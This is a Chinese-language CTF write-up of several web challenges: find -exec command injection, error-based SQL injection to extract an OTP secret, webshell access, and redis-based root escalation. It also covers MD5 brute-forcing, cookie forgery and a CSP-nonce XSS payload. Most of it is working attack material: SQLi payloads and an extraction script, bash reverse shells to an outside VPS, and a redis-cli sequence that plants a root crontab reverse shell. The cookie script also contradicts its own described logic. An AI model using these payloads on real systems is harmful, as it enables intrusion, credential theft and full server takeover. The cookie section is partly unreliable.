##  search

### 考点

就是一个对`find`的命令了解,参数exec可以实现命令

###  wp

payload

```php
/search.php?search=flag -exec cat {} \;
```

## google authenticator

###  考点

1. sql注入，拿到secret的密钥
1. google身份验证码的实现
1. 蚁剑连接，无权限，进行信息收集
1. 蚁剑反弹shell到vps
1. 非交互式shell变为交互式shell的两种方式
1. 写定时任务redis提权

###  wp

看到登录界面，扫一波，没有东西

尝试进行sql注入

先来个万能密码登录,`username=1' or 1=1#&password=123456`

有个`/google_authenticator.php`

我们访问，需要google验证码，似乎没有利用点了

所以我们继续sql注入，看到报错信息，利用报错注入

获取数据库

```
username=1' and (updatexml(1,concat(0x7e,(select database()),0x7e),1))#&password=123456

actf_is_fun
```

获取表

```
username=1' and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='actf_is_fun'),0x7e),1))#&password=123456

users
```

获取列名

```
username=1' and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='actf_is_fun' and table_name='users'),0x7e),1))#&password=123456、

id,username,password,otp_secret
```

先查username和password，登录进去就是我们万能密码一样的

```
username=1' and (updatexml(1,concat(0x7e,(select group_concat(password) from actf_is_fun.users),0x7e),1))#&password=123456

admin和hgMMDHmE6qn#U9
```

查另一个，因为一次只能查部分字段，所以加个substr得到字段名为`otp_secret_key`

```
username=1' and (updatexml(1,concat(0x7e,(select group_concat(otp_secret_key) from actf_is_fun.users),0x7e),1))#&password=123456

eyJhbGciOiJIUzI1NiIsInR5cCI6Ikp
```

给出脚本

```python
import requests

url="http://1.14.71.254:28809/index.php"


for i in range(1,180):
    user = "1'and(select updatexml(1,concat(0x7e,(select substr(group_concat(otp_secret_key),{},1)from users)),0x7e))#".format(i)
    data = {
        'password':123,
        'username':user
    }
    res = requests.post(url=url,data=data).text
    index = res.index("~")
    print(res[index+1:index+2],end="")
```

得到

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXQiOiJJRkJWSVJTN01KU1hJNURGT0pQV0MzVEVMNVJHSzVEVU1WWkNDSUpCIiwiaWF0IjoxNTE2MjM5MDIyfQ.AQSSxyPihDP8dhVEMpaWrSv2scrEEc2HOmqfAwXqWLY
```

base64解密后

```
{"alg":"HS256","typ":"JWT"}{"secret":"IFBVIRS7MJSXI5DFOJPWC3TEL5RGK5DUMVZCCIJB","iat":1516239022} I,r>(C?�aTC)ijҿk�A�s���0^��
```

拿到secret后，因为是要google身份验证码

[google身份验证码的原理](https://zhuanlan.zhihu.com/p/132478048)

在github上开源的**[ GoogleAuthenticator](https://github.com/PHPGangsta/GoogleAuthenticator)**

读取`GoogleAuthenticator.php`,写个test.php,获取对应secret的身份验证码

```php
<?php
require_once 'GoogleAuthenticator.php';
$ga = new PHPGangsta_GoogleAuthenticator();
$secret = "IFBVIRS7MJSXI5DFOJPWC3TEL5RGK5DUMVZCCIJB";

$oneCode = $ga->getCode($secret); //服务端计算"一次性验证码"
echo "服务端计算的验证码是:".$oneCode."\n\n";

```

输入后，获取一个php路径

![image-20220417100949472](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202204171010979.png)

![image-20220417101017119](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202204171010494.png)

访问连接蚁剑

![image-20220417101255123](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202204171012217.png)

需要提权

只有先信息收集了

![image-20220417101351768](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202204171013854.png)

SUID提权不行，脏牛提权没有gcc不行

先看一下进程信息

![image-20220417102525498](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202204171027955.png)

有redis

redis 利用方式本质是写文件，一般使用下面三种方法

- 写Webshell
- 写SSH Key
- 写定时任务

此外还可以redis 加载`.so`模块从而命令执行，主从复制RCE，但是需要redis >= 4.0 ,当前环境的redis 版本是 3.2.12

写Webshell，写到Web目录下还是apache权限，写SSH Key 也没有 SSH 可以远程连接



有个redis和linux定时任务，redis-cli结合定时任务来反弹root权限的shell提权

先反弹shell到vps上

```
bash -i >& /dev/tcp/192.168.145.128/4444 0>&1 
```

>`redis-cli`是Redis命令行工具，是一个命令行客户端程序，可以将命令直接发送到Redis，并直接从终端读取服务器返回的应答,有交互模式和参数模式
>
>redis-cli，不需要认证可以直接启动并连接redis服务器

首先redis-cli需要交互模式，但是反弹shell不是交互模式，我们需要将非交互模式变为交互模式

![image-20220417110745386](C:/Users/15908387732/AppData/Roaming/Typora/typora-user-images/image-20220417110745386.png)

这就是因为shell是非交互模式，不能与服务器直接进行交互



第一种方法

redis-cli 执行lua脚本是不能执行配置文件那些命令的，但是可以通过shell脚本来执行

进行下面的操作

这儿我尝试了好久，才成功

`redis-cli <<-END`应该是打开终端

```
bash-4.2$ redis-cli <<-END
redis-cli <<-END
> set task "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/你的ip/端口 0>&1\n\n"
set task "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/你的ip/端口 0>&1\n\n"
> config set dir /var/spool/cron
config set dir /var/spool/cron
> config set dbfilename root
config set dbfilename root
> save
save
> END
END

```

然后监听就可以得到root的shell

![image-20220417122045247](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202204171230524.png)



第二种方式，就是将普通的[非交互式shell变为交互式shell](https://www.jianshu.com/p/e7202cb2c3dd)

vps上输入下面操作，获得交互式shell后

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
$ stty raw -echo;fg
$ reset
$ export SHELL=bash
//$ export TERM=xterm-256color
```

利用redis-cli写定时任务提权

```
config set dir /var/spool/cron/
config set dbfilename root
set x "\n* * * * * bash -i >& /dev/tcp/ip/port 0>&1\n"
save
```

![image-20220417124607833](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202204171246010.png)

最后还是监听，获取root的shell

![image-20220417124635562](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202204171246688.png)

## secret

###  考点

1. md5爆破
2. cookie伪造，找cookie的加密方式

经典的爆破md5

```python
import hashlib

for i in range(1,1000000000):
    str1=hashlib.md5(str(i).encode("UTF-8")).hexdigest()
    if(str1[0:6]=='0feeb5'):
        print(i)
        print(str1)
        break
```

登录有secret.jsp,说要admin才能查看

登录admin，密码错误，这儿可能有sql注入之类的

但是wp上是伪造cookie

cookie的加密逻辑也就是逐位判断奇偶，偶加2，奇加1，然后加上一个随机字符，最后脚本如下

```python
import requests

def encrypt(s):
    res = ""
    for i in s:
        if ord(i)%2 == 0:
            res += chr(ord(i) + 2)
        else:
            res += chr(ord(i) - 2)
        res += "a"
    return res

def main():
    url = "http://1.14.71.254:28543/" + "secret.jsp"
    cookies = {"usr" : encrypt("admin")}
    res = requests.get(url, cookies=cookies)
    print(res.text)

if __name__ == "__main__":
    main()
```

得到flag

##  BABY_CSP

###  考点

属于前端安全方面的，考CSP

参考：

```
http://www.ruanyifeng.com/blog/2016/09/csp.html
https://blog.csdn.net/weixin_42478365/article/details/116597764
```

###  wp

响应包看到`CSP`中有`nonce`的值，有nonce的值就可以执行一些代码

payload

```
?school=<script nonce="29de6fde0db5686d">alert(flag)<script>
```

##  若依

还没学java，后面再复现吧

考点：java的shiro